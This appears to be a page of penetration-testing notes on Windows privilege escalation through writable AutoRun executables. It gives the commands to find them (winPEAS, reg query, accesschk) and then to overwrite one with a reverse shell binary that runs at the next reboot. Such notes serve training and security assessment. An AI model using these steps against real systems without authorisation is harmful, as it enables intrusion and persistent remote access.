# AutoRuns

Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system \(or wait for it to be restarted\) you may be able to escalate privileges.

Use winPEAS to check for writable AutoRun executables:

```text
winPEASany.exe quiet applicationsinfo
```

![](../../../../.gitbook/assets/image%20%28148%29.png)

Alternatively, we could manually enumerate the AutoRun executables:

```text
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

and then use accesschk.exe to verify the permissions on each one:

```text
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

![](../../../../.gitbook/assets/image%20%28150%29.png)

The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:

```text
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
```

Copy our reverse shell executable to overwrite the AutoRun executable:

```text
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\AutorunProgram\program.exe"
```

![](../../../../.gitbook/assets/image%20%28154%29.png)

now start a listener on attacker machine and wait for the system to reboot, the autorun task will start and you will get a remote shell.

{% hint style="info" %}
on windows 10 the exploit will be triggered with the privileges of the last logged on user. so it is possible that we get another shell with the same user privileges. 
{% endhint %}





